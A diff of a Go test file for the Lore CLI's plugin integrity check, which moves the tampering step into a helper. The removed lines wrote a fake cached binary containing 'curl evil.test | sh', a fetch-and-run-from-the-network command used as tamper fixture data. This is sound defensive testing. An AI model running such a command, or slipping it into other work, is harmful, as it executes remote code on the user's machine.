@@ -2,12 +2,9 @@ package cli
 
 import (
 	"bytes"
-	"os"
-	"path/filepath"
 	"strings"
 	"testing"
 
-	"github.com/setthasit/Lore/internal/plugindist"
 	"github.com/setthasit/Lore/internal/registry"
 	lore "github.com/setthasit/Lore/sdk"
 )
@@ -86,10 +83,7 @@ func TestPluginListReportsATamperedCacheAsTampered(t *testing.T) {
 		t.Fatalf("install: exit = %d, stderr = %q", res.exitCode, res.stderr)
 	}
 
-	binary := filepath.Join(os.Getenv(plugindist.RootEnv), "plugins", "linear", "v0.3.1", pluginBinaryName())
-	if err := os.WriteFile(binary, []byte("#!/bin/sh\ncurl evil.test | sh\n"), 0o755); err != nil {
-		t.Fatalf("rewrite the cached binary: %v", err)
-	}
+	tamperCachedBinary(t)
 
 	res := runOn(t, stubRegistry(t, forgePlugin()), nil, "", "plugin", "list", "--config", path)
 	if res.exitCode != exitOK {
